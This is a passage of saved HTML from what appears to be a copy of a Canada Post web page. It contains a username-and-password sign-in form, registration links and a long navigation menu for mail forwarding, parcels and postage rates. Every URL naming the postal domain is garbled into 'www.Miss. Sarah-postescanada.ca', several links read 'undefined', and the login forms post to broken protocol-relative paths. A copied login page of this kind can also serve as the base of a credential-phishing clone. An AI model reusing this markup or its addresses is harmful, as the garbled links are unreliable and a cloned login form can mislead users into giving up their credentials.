Sarah-postescanada.ca%2Fpfe-pap%2Fen%2Fregistration%2Femail-verification%3Fid%3D432be7f1e8dc425dbde71cc59877fb46%26targetUrl%3Dhttps%253A%252F%252Fwww.Miss. Sarah-postescanada.ca%252Fshop-login%26forceVouchFor%3Dtrue&businessUrl=https%3A%2F%2Fwww.Miss. Sarah-postescanada.ca%2Fdash-tableau%2Fen%2F%3FforceVouchFor%3Dtrue" class="sso_link" businessurl="//dash-tableau/en/" tabindex="-1">Password?</a>
    </p>
    <input name="cpidSignIn_SUBMIT" value="1" type="hidden">
    <input name="cpidSignIn_widgetSignIn" value="1" type="hidden">
    
  </form>

    </div>
  
    <div class="large-6 columns cpc-modal__fluid-gutter-m columns content">
<h3 class="right-area-heading">Register online</h3>
<p class="signup-text">
  Create an online account to save tracked items, unlock valuable discounts for your business, and more.
</p>

<!--Leaving list items for possible future implementation-->
<!--<ul class="visible-for-large-up">-->
  <!--<li>Access your personalized dashboard in a few easy steps! </li>-->
  <!--<li>undefined</li>-->
  <!--<li>undefined</li>-->
<!--</ul>-->
<p class="signup-text visible-for-large-up">
  Access your personalized dashboard in a few easy steps! 
</p>

<p class="sign-in-up-buttons">
  <a role="button" tabindex="0" href="//pfe-pap/en/registration?&sourceUrl=https%3A%2F%2Fsso-osu.Miss. Sarah-postescanada.ca%2Fpfe-pap%2Fen%2Fregistration%2Femail-verification%3Fid%3D432be7f1e8dc425dbde71cc59877fb46%26targetUrl%3Dhttps%253A%252F%252Fwww.Miss. Sarah-postescanada.ca%252Fshop-login&targetUrl=https%3A%2F%2Fsso-osu.Miss. Sarah-postescanada.ca%2Fpfe-pap%2Fen%2Fregistration%2Femail-verification%3Fid%3D432be7f1e8dc425dbde71cc59877fb46%26targetUrl%3Dhttps%253A%252F%252Fwww.Miss. Sarah-postescanada.ca%252Fshop-login%26forceVouchFor%3Dtrue&businessUrl=https%3A%2F%2Fwww.Miss. Sarah-postescanada.ca%2Fdash-tableau%2Fen%2F%3FforceVouchFor%3Dtrue" class="sso_link button nomargin" tabindex="-1">Register now</a>
</p>
</div>
  </div>
</div>

</script></div><div class="mobile-container-wrapper show-for-medium-down">
    <div class="top-section top-section--main">
      
    <ul class="main-nav-header active">
      <li class="cpc-mobile-menu">
        <div class="cpc-mobile-menu-trigger" aria-label="Menu" id="trigger" tabindex="0"></div>
      </li>
      <li class="logo">
        <a href="//cpc/en" class=""><img src="./successful_files/cpc-logo.svg" alt="Canada Post"></a>
            <a href="//pfe-pap/en/registration/undefined" class="hide"><img src="./successful_files/cpc-logo.svg" alt="Canada Post"></a>
      </li>
      <li class="mobile-nav-top-r-links ">
        <div class="top-r-links-container">
          
          <a href="//pfe-pap/en/registration/email-verification?id=432be7f1e8dc425dbde71cc59877fb46&amp;targetUrl=https:%2F%2Fwww.Miss. Sarah-postescanada.ca%2Fshop-login#" class="menu-search " aria-label="Search our website">
            <img src="./successful_files/search.svg" alt="Search">
          </a>
          <a target="_blank" rel="noopener" href="//pfe-pap/en/registration/undefined" undefined="" class="menu-campaign-cta hide">undefined</a>
        </div>
      </li>
    </ul>

    </div>
      
    <div class="mobile-container" id="main-nav-wrapper">
    <nav id="main-nav" class="cpc-menu menu-item--cover" role="navigation" aria-label="undefined" style="transform: translate3d(-100%, 0px, 0px);">
     
      <div class="menu-item-level" data-level="1">

      <div class="top-section">
      
      <ul class="main-l0-header">
        <li class="cpc-mobile-menu">
          <div class="cpc-mobile--hamburger" aria-label="Menu" id="trigger-close" tabindex="0">
            <span></span>
            <span></span>
          </div>
        </li>
        <li class="mobile-nav-myAccount">
            <a href="//pfe-pap/en/registration/email-verification?id=432be7f1e8dc425dbde71cc59877fb46&amp;targetUrl=https:%2F%2Fwww.Miss. Sarah-postescanada.ca%2Fshop-login#" class="my-account-sign-in">Sign in or Register</a>
            <a href="//pfe-pap/en/registration/email-verification?id=432be7f1e8dc425dbde71cc59877fb46&amp;targetUrl=https:%2F%2Fwww.Miss. Sarah-postescanada.ca%2Fshop-login#" class="my-account-login">Back</a>
            <a href="//pfe-pap/en/registration/email-verification?id=432be7f1e8dc425dbde71cc59877fb46&amp;targetUrl=https:%2F%2Fwww.Miss. Sarah-postescanada.ca%2Fshop-login#" class="my-account-signout">Sign out</a>
        </li>
        <li class="hide">
        <a target="_blank" rel="noopener" href="//pfe-pap/en/registration/undefined" undefined="" class="campaign-cta">undefined</a>
        </li>
      </ul>
  
        <ul class="main-l1-header undefined">
          <li class="mobile-main-back">
            <a href="//pfe-pap/en/registration/email-verification?id=432be7f1e8dc425dbde71cc59877fb46&amp;targetUrl=https:%2F%2Fwww.Miss. Sarah-postescanada.ca%2Fshop-login#" aria-label="Back to main menu" tabindex="0">Back to main menu </a>
            </li>
        </ul>
    <ul class="main-l2-header undefined">
      <li class="mobile-main-back">
        <a href="//pfe-pap/en/registration/email-verification?id=432be7f1e8dc425dbde71cc59877fb46&amp;targetUrl=https:%2F%2Fwww.Miss. Sarah-postescanada.ca%2Fshop-login#" aria-label="Back to main navigation" tabindex="0"></a>
      </li>
      <li class="mobile-sublevel-back">
        <a class="menu-item-back" href="//pfe-pap/en/registration/email-verification?id=432be7f1e8dc425dbde71cc59877fb46&amp;targetUrl=https:%2F%2Fwww.Miss. Sarah-postescanada.ca%2Fshop-login#" aria-label="Back">Back </a>
        </li>
       
    </ul>
      </div>
      
        <ul id="mobile-nav-section-log-in" class="menu-log-in-links">
        
  <div class="my-account-wrapper">
    <div class="my-account-form">
      <form method="post" action="//lfe-cap/en/login?stepupId=smb_mode1,consumer,commercial_link,smb_link&amp;sourceUrl=https%3A%2F%2Fsso-osu.Miss. Sarah-postescanada.ca%2Fpfe-pap%2Fen%2Fregistration%2Femail-verification%3Fid%3D432be7f1e8dc425dbde71cc59877fb46%26targetUrl%3Dhttps%253A%252F%252Fwww.Miss. Sarah-postescanada.ca%252Fshop-login&amp;targetUrl=https%3A%2F%2Fsso-osu.Miss. Sarah-postescanada.ca%2Fpfe-pap%2Fen%2Fregistration%2Femail-verification%3Fid%3D432be7f1e8dc425dbde71cc59877fb46%26targetUrl%3Dhttps%253A%252F%252Fwww.Miss. Sarah-postescanada.ca%252Fshop-login%26forceVouchFor%3Dtrue&amp;businessUrl=https%3A%2F%2Fwww.Miss. Sarah-postescanada.ca%2Fdash-tableau%2Fen%2F%3FforceVouchFor%3Dtrue" stepup="1" name="headerSISU" class="cpidSignIn sso_form" businessurl="https://www.Miss. Sarah.ca/dash-tableau/en/" id="signinFormMobile">
        <div class="signin-account-container">
          <h3 class="signin-header">Access your account</h3>
          <label for="username" class="title">Username</label>
          <input id="username" placeholder="" name="username" type="text">
          <div class="rememberme-wrapper">
            <input value="1" id="rememberme" name="rememberme" type="checkbox">
            <label for="rememberme">Remember my username on this device</label>
          </div>
          <label for="password" class="title">Password</label>
          <input id="password" placeholder="" name="password" type="password" autocomplete="nope">
          <input value="Sign in" class="button" type="submit">
          <div class="user-secure">
          Forgot <a href="//lfe-cap/en/forgot-username?&amp;sourceUrl=https%3A%2F%2Fsso-osu.Miss. Sarah-postescanada.ca%2Fpfe-pap%2Fen%2Fregistration%2Femail-verification%3Fid%3D432be7f1e8dc425dbde71cc59877fb46%26targetUrl%3Dhttps%253A%252F%252Fwww.Miss. Sarah-postescanada.ca%252Fshop-login&amp;targetUrl=https%3A%2F%2Fsso-osu.Miss. Sarah-postescanada.ca%2Fpfe-pap%2Fen%2Fregistration%2Femail-verification%3Fid%3D432be7f1e8dc425dbde71cc59877fb46%26targetUrl%3Dhttps%253A%252F%252Fwww.Miss. Sarah-postescanada.ca%252Fshop-login%26forceVouchFor%3Dtrue&amp;businessUrl=https%3A%2F%2Fwww.Miss. Sarah-postescanada.ca%2Fdash-tableau%2Fen%2F%3FforceVouchFor%3Dtrue" class="sso_link" businessurl="https://www.Miss. Sarah.ca/dash-tableau/en/" tabindex="0">Username?</a> or
            <a href="//lfe-cap/en/forgot-password?&amp;sourceUrl=https%3A%2F%2Fsso-osu.Miss. Sarah-postescanada.ca%2Fpfe-pap%2Fen%2Fregistration%2Femail-verification%3Fid%3D432be7f1e8dc425dbde71cc59877fb46%26targetUrl%3Dhttps%253A%252F%252Fwww.Miss. Sarah-postescanada.ca%252Fshop-login&amp;targetUrl=https%3A%2F%2Fsso-osu.Miss. Sarah-postescanada.ca%2Fpfe-pap%2Fen%2Fregistration%2Femail-verification%3Fid%3D432be7f1e8dc425dbde71cc59877fb46%26targetUrl%3Dhttps%253A%252F%252Fwww.Miss. Sarah-postescanada.ca%252Fshop-login%26forceVouchFor%3Dtrue&amp;businessUrl=https%3A%2F%2Fwww.Miss. Sarah-postescanada.ca%2Fdash-tableau%2Fen%2F%3FforceVouchFor%3Dtrue" class="sso_link" businessurl="https://www.Miss. Sarah.ca/dash-tableau/en/" tabindex="0">Password?</a>
          </div>
        </div>
        <div class="create-account-container">
          <h3 class="signin-header">Register online</h3>
          <p class="signup-text-mobile">
            Create an online account in a few easy steps!
          </p>
          <a href="//pfe-pap/en/registration?&amp;sourceUrl=https%3A%2F%2Fsso-osu.Miss. Sarah-postescanada.ca%2Fpfe-pap%2Fen%2Fregistration%2Femail-verification%3Fid%3D432be7f1e8dc425dbde71cc59877fb46%26targetUrl%3Dhttps%253A%252F%252Fwww.Miss. Sarah-postescanada.ca%252Fshop-login&amp;targetUrl=https%3A%2F%2Fsso-osu.Miss. Sarah-postescanada.ca%2Fpfe-pap%2Fen%2Fregistration%2Femail-verification%3Fid%3D432be7f1e8dc425dbde71cc59877fb46%26targetUrl%3Dhttps%253A%252F%252Fwww.Miss. Sarah-postescanada.ca%252Fshop-login%26forceVouchFor%3Dtrue&amp;businessUrl=https%3A%2F%2Fwww.Miss. Sarah-postescanada.ca%2Fdash-tableau%2Fen%2F%3FforceVouchFor%3Dtrue" stepup="1" class="button sso_link" businessurl="https://www.Miss. Sarah.ca/dash-tableau/en/" tabindex="0">Register now</a>
        </div>
      </form>
    </div>
  </div>
        </ul>
        <ul id="mobile-nav-section-signed-in" class="menu-signed-in-links">
        
      <li class="auth-link user-nav-wrapper">
        <h4 class="sso-username">Hello, <strong></strong></h4>
        <ul class="sso-user-nav menu--profile-links">
          <li><a href="//dash-tableau/en" class="parent-link">Dashboard</a></li>
          <li><a href="//pfe2-pap2/en" '="" class="parent-link">My Profile</a></li>
          <li><a href="//cpotools/apps/ccm/support" class="parent-link">My Support</a></li>
        </ul>
        
      </li>
      <li class="auth-link sign-out"></li>
    
        </ul>
        <ul id="mobile-nav-section-main" class="menu-main-links active" data-sitemap="mainMenu">
          
  <ul>
    <li>
      <a id="mobile-nav-toggle-personal" href="//pfe-pap/en/registration/email-verification?id=432be7f1e8dc425dbde71cc59877fb46&amp;targetUrl=https:%2F%2Fwww.Miss. Sarah-postescanada.ca%2Fshop-login#" class="my-personal-link cpc-section-toggle parent-link" data-sitemap="personal">Personal</a>
    </li>
    <li>
      <a id="mobile-nav-toggle-business" href="//pfe-pap/en/registration/email-verification?id=432be7f1e8dc425dbde71cc59877fb46&amp;targetUrl=https:%2F%2Fwww.Miss. Sarah-postescanada.ca%2Fshop-login#" class="my-business-link cpc-section-toggle parent-link active" data-sitemap="business">Business</a>
    </li>
    <li class="my-aboutus-list-item">
      <a id="mobile-nav-toggle-our-company" href="//pfe-pap/en/registration/email-verification?id=432be7f1e8dc425dbde71cc59877fb46&amp;targetUrl=https:%2F%2Fwww.Miss. Sarah-postescanada.ca%2Fshop-login#" class="my-aboutus-link cpc-section-toggle parent-link" data-sitemap="our-company">Our company</a>
    </li><li>
    </li><li>
      <a id="mobile-nav-toggle-shop" href="//pfe-pap/en/registration/email-verification?id=432be7f1e8dc425dbde71cc59877fb46&amp;targetUrl=https:%2F%2Fwww.Miss. Sarah-postescanada.ca%2Fshop-login#" class="my-shop-link cpc-section-toggle parent-link" data-sitemap="shop">Store</a>
    </li><li>
    </li><li>
      <a id="mobile-nav-toggle-support" href="//cpc/en/support.page" class="my-support-link" data-sitemap="support">Support</a>
    </li><li>

  </li></ul>
  
        </ul>
        <ul id="mobile-nav-section-personal" class="menu-primary-links" data-sitemap="personal">
           
      <div class="menu-overview">
      <a class="parent-title" href="//cpc/en/personal.page?" target="">
      <h3 class="submenu-header">Personal<span class="open-new-window"></span></h3>
      <p>Learn about mailing services for individuals.</p>
      </a>
      </div> 
      
          <li>
            <a href="//cpc/en/personal/receiving.page?" class="parent-link" target="" alt="">Receiving</a>
            <div class="menu-item-level level1" data-level="2">
              <div class="menu-overview">
              <a class="parent-title" href="//cpc/en/personal/receiving.page?" target="" alt="">
              <h3 class="submenu-header">Receiving<span class="open-new-window"></span></h3>
                <p>Learn about the different ways to receive your mail and packages.</p>
              </a>
              </div> 
              <ul>
                
          <li>
            <a href="//cpc/en/personal/receiving/manage-mail.page?" class="menu-title parent-link" target="" alt="">Manage your mail</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/personal/receiving/manage-mail.page?" target="" alt="">
          <h3 class="submenu-header">Manage your mail<span class="open-new-window"></span></h3>
          <p>Learn about residential community mailboxes and moving mail services.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="//cpc/en/personal/receiving/manage-mail/mail-forwarding.page?" class="parent-link" target="" alt="">Forward your mail</a>
      <div class="menu-item-level level4" data-level="4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/personal/receiving/manage-mail/mail-forwarding.page?" target="" alt="">
        <h3 class="submenu-header">Forward your mail<span class="open-new-window"></span></h3>
        <p>Forward mail to a new or temporary address.</p>
        </a>
        </div> 
        <ul>
          
          <li>
          <a href="//cpc/en/personal/receiving/manage-mail/mail-forwarding/custom-commercial.page?" class="" target="" alt="">Customized Mail Forwarding for commercial customers</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="//cpc/en/personal/receiving/manage-mail/mail-forwarding/custom-commercial.page?" target="" alt="">
            <h3 class="submenu-header">Customized Mail Forwarding for commercial customers<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/personal/receiving/manage-mail/hold-mail.page?" class="" target="" alt="">Hold your mail</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/personal/receiving/manage-mail/hold-mail.page?" target="" alt="">
        <h3 class="submenu-header">Hold your mail<span class="open-new-window"></span></h3>
        <p>Temporarily stop mail delivery to your address.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/personal/receiving/manage-mail/epost.page?" class="" target="" alt="">Get bills and statements online (epost)</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/personal/receiving/manage-mail/epost.page?" target="" alt="">
        <h3 class="submenu-header">Get bills and statements online (epost)<span class="open-new-window"></span></h3>
        <p>Set up a free account to get bills and statements securely, online.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="//cpc/en/personal/receiving/alternative-delivery.page?" class="menu-title parent-link" target="" alt="">Alternative delivery options</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/personal/receiving/alternative-delivery.page?" target="" alt="">
          <h3 class="submenu-header">Alternative delivery options<span class="open-new-window"></span></h3>
          <p>Learn about receiving mail at the post office and condo parcel lockers.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="//cpc/en/personal/receiving/alternative-delivery/flexdelivery.page?" class="" target="" alt="">Deliver purchases to post office (FlexDelivery)</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/personal/receiving/alternative-delivery/flexdelivery.page?" target="" alt="">
        <h3 class="submenu-header">Deliver purchases to post office (FlexDelivery)<span class="open-new-window"></span></h3>
        <p>Have packages sent to the post office for pickup. </p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/personal/receiving/alternative-delivery/post-office-box.page?" class="" target="" alt="">Rent a post office box</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/personal/receiving/alternative-delivery/post-office-box.page?" target="" alt="">
        <h3 class="submenu-header">Rent a post office box<span class="open-new-window"></span></h3>
        <p>Rent a secure PO box to receive mail and packages.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/personal/receiving/alternative-delivery/parcel-lockers.page?" class="" target="" alt="">Parcel lockers</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/personal/receiving/alternative-delivery/parcel-lockers.page?" target="" alt="">
        <h3 class="submenu-header">Parcel lockers<span class="open-new-window"></span></h3>
        <p>Pick up packages from the locker in your condo or apartment building.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="//cpc/en/personal/receiving/moving-house.page?" class="menu-title " target="" alt="">Moving to a new home</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/personal/receiving/moving-house.page?" target="" alt="">
          <h3 class="submenu-header">Moving to a new home<span class="open-new-window"></span></h3>
          <p>Learn about mail forwarding and accessing your new community mailbox.</p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="//track-reperage/en" class="menu-title parent-link" target="" alt="">Track a package</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="//track-reperage/en" target="" alt="">
          <h3 class="submenu-header">Track a package<span class="open-new-window"></span></h3>
          <p>Learn about tracking, delivery notice cards and reference numbers.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="//cpc/en/personal/receiving/automatic-tracking.page?" class="" target="" alt="">Automatic tracking</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/personal/receiving/automatic-tracking.page?" target="" alt="">
        <h3 class="submenu-header">Automatic tracking<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="//information/app/fpo/personal/findpostoffice" class="menu-title " target="" alt="">Find a post office</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="//information/app/fpo/personal/findpostoffice" target="" alt="">
          <h3 class="submenu-header">Find a post office<span class="open-new-window"></span></h3>
          <p></p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="//cpc/en/personal/receiving/mobile-app.page?" class="menu-title " target="" alt="">Our mobile app</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/personal/receiving/mobile-app.page?" target="" alt="">
          <h3 class="submenu-header">Our mobile app<span class="open-new-window"></span></h3>
          <p>Learn about our free app and get package updates on the go. </p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
              </ul>
            </div>
          </li>
    
          <li>
            <a href="//cpc/en/personal/sending.page?" class="parent-link" target="" alt="">Sending</a>
            <div class="menu-item-level level1" data-level="2">
              <div class="menu-overview">
              <a class="parent-title" href="//cpc/en/personal/sending.page?" target="" alt="">
              <h3 class="submenu-header">Sending<span class="open-new-window"></span></h3>
                <p>View postage rates and shipping services for mail and packages.</p>
              </a>
              </div> 
              <ul>
                
          <li>
            <a href="//cpc/en/personal/sending/letters-mail.page?" class="menu-title parent-link" target="" alt="">Letters and mail</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/personal/sending/letters-mail.page?" target="" alt="">
          <h3 class="submenu-header">Letters and mail<span class="open-new-window"></span></h3>
          <p>Learn about postage prices and mail sizing.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="//cpc/en/personal/sending/letters-mail/postage-rates.page?" class="" target="" alt="">Postage rates</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/personal/sending/letters-mail/postage-rates.page?" target="" alt="">
        <h3 class="submenu-header">Postage rates<span class="open-new-window"></span></h3>
        <p>Mailing prices for domestic and international letters and cards.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/personal/sending/letters-mail/letter-size.page?" class="" target="" alt="">Letter weight and size</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/personal/sending/letters-mail/letter-size.page?" target="" alt="">
        <h3 class="submenu-header">Letter weight and size<span class="open-new-window"></span></h3>
        <p>Measurements for standard and oversized or non-standard mail.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/personal/sending/letters-mail/registered-mail.page?" class="" target="" alt="">Register your mail</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/personal/sending/letters-mail/registered-mail.page?" target="" alt="">
        <h3 class="submenu-header">Register your mail<span class="open-new-window"></span></h3>
        <p>Buy Registered Mail™ to get proof your letter was received.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/personal/sending/letters-mail/custom-stamps.page?" class="" target="" alt="">Create custom stamps</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/personal/sending/letters-mail/custom-stamps.page?" target="" alt="">
        <h3 class="submenu-header">Create custom stamps<span class="open-new-window"></span></h3>
        <p>Design personal stamps for domestic and international mailing.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="//cpc/en/personal/sending/parcels.page?" class="menu-title parent-link" target="" alt="">Parcels</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/personal/sending/parcels.page?" target="" alt="">
          <h3 class="submenu-header">Parcels<span class="open-new-window"></span></h3>
          <p>Learn about different shipping services for packages.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="//cpc/en/personal/sending/parcels/ship-online.page?" class="" target="" alt="">Ship online</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/personal/sending/parcels/ship-online.page?" target="" alt="">
        <h3 class="submenu-header">Ship online<span class="open-new-window"></span></h3>
        <p>Create, pay for and print a shipping label online.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/personal/sending/parcels/return-labels.page?" class="" target="" alt="">Return your purchase</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/personal/sending/parcels/return-labels.page?" target="" alt="">
        <h3 class="submenu-header">Return your purchase<span class="open-new-window"></span></h3>
        <p>Access and print a return shipping label online.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/personal/sending/parcels/restrictions.page?" class="parent-link" target="" alt="">View restrictions</a>
      <div class="menu-item-level level4" data-level="4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/personal/sending/parcels/restrictions.page?" target="" alt="">
        <h3 class="submenu-header">View restrictions<span class="open-new-window"></span></h3>
        <p>Learn about non-mailable and controlled item restrictions by country.</p>
        </a>
        </div> 
        <ul>
          
          <li>
          <a href="//cpc/en/personal/sending/parcels/restrictions/cannabis.page?" class="" target="" alt="">Cannabis</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="//cpc/en/personal/sending/parcels/restrictions/cannabis.page?" target="" alt="">
            <h3 class="submenu-header">Cannabis<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="//cpc/en/personal/sending/parcels/restrictions/firearms.page?" class="" target="" alt="">Firearms</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="//cpc/en/personal/sending/parcels/restrictions/firearms.page?" target="" alt="">
            <h3 class="submenu-header">Firearms<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/personal/sending/parcels/compare-services-canada.page?" class="parent-link" target="" alt="">Compare shipping services in Canada</a>
      <div class="menu-item-level level4" data-level="4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/personal/sending/parcels/compare-services-canada.page?" target="" alt="">
        <h3 class="submenu-header">Compare shipping services in Canada<span class="open-new-window"></span></h3>
        <p>Learn about domestic shipping speeds and features.</p>
        </a>
        </div> 
        <ul>
          
          <li>
          <a href="//cpc/en/personal/sending/parcels/compare-services-canada/regular.page?" class="" target="" alt="">Regular Parcel</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="//cpc/en/personal/sending/parcels/compare-services-canada/regular.page?" target="" alt="">
            <h3 class="submenu-header">Regular Parcel<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="//cpc/en/personal/sending/parcels/compare-services-canada/xpresspost.page?" class="" target="" alt="">Xpresspost</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="//cpc/en/personal/sending/parcels/compare-services-canada/xpresspost.page?" target="" alt="">
            <h3 class="submenu-header">Xpresspost<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="//cpc/en/personal/sending/parcels/compare-services-canada/priority.page?" class="" target="" alt="">Priority</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="//cpc/en/personal/sending/parcels/compare-services-canada/priority.page?" target="" alt="">
            <h3 class="submenu-header">Priority<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/personal/sending/parcels/compare-services-international.page?" class="parent-link" target="" alt="">Compare international shipping services</a>
      <div class="menu-item-level level4" data-level="4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/personal/sending/parcels/compare-services-international.page?" target="" alt="">
        <h3 class="submenu-header">Compare international shipping services<span class="open-new-window"></span></h3>
        <p>Learn about international shipping speeds and features.</p>
        </a>
        </div> 
        <ul>
          
          <li>
          <a href="//cpc/en/personal/sending/parcels/compare-services-international/small-packet-usa.page?" class="" target="" alt="">Small Packet USA</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="//cpc/en/personal/sending/parcels/compare-services-international/small-packet-usa.page?" target="" alt="">
            <h3 class="submenu-header">Small Packet USA<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="//cpc/en/personal/sending/parcels/compare-services-international/small-packet-international.page?" class="" target="" alt="">Small Packet International – Air or Surface</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="//cpc/en/personal/sending/parcels/compare-services-international/small-packet-international.page?" target="" alt="">
            <h3 class="submenu-header">Small Packet International – Air or Surface<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="//cpc/en/personal/sending/parcels/compare-services-international/xpresspost-international.page?" class="" target="" alt="">Xpresspost – International</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="//cpc/en/personal/sending/parcels/compare-services-international/xpresspost-international.page?" target="" alt="">
            <h3 class="submenu-header">Xpresspost – International<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="//cpc/en/personal/sending/parcels/compare-services-international/xpresspost-usa.page?" class="" target="" alt="">Xpresspost – USA</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="//cpc/en/personal/sending/parcels/compare-services-international/xpresspost-usa.page?" target="" alt="">
            <h3 class="submenu-header">Xpresspost – USA<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="//cpc/en/personal/sending/parcels/compare-services-international/tracked-packet-international.page?" class="" target="" alt="">Tracked Packet – International</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="//cpc/en/personal/sending/parcels/compare-services-international/tracked-packet-international.page?" target="" alt="">
            <h3 class="submenu-header">Tracked Packet – International<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="//cpc/en/personal/sending/parcels/compare-services-international/tracked-packet-usa.page?" class="" target="" alt="">Tracked Packet – USA</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="//cpc/en/personal/sending/parcels/compare-services-international/tracked-packet-usa.page?" target="" alt="">
            <h3 class="submenu-header">Tracked Packet – USA<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="//cpc/en/personal/sending/parcels/compare-services-international/expedited-usa.page?" class="" target="" alt="">Expedited Parcel – USA</a>
